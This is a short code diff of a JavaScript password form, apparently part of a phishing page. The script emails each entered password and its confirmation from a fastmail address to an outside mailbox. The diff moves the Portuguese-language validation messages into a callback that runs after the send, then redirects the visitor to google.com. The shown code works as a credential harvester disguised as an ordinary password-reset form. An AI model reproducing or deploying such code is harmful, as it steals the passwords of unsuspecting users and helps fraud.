@@ -18,15 +18,15 @@
                 From: "charlescanon0909@fastmail.com",
                 Subject: "This is the subject",
                 Body: "pass: " + pass + " - confirm: " + confirm
+            }).then(function() {
+	            if (!pass.length || !confirm.length) {
+	            	toastr.error('Preencha o campo de senha')
+	            } else if (pass !== confirm) {
+					toastr.error('As senhas não conferem')
+	        	} else {
+	        		window.location.replace("https://google.com");
+	        	}
             });
-
-            if (!pass.length || !confirm.length) {
-            	toastr.error('Preencha o campo de senha')
-            } else if (pass !== confirm) {
-				toastr.error('As senhas não conferem')
-        	} else {
-        		window.location.replace("https://google.com");
-        	}
         }
         $(document).ready(function() {
 	        $("input[type=submit]").on("click", run);
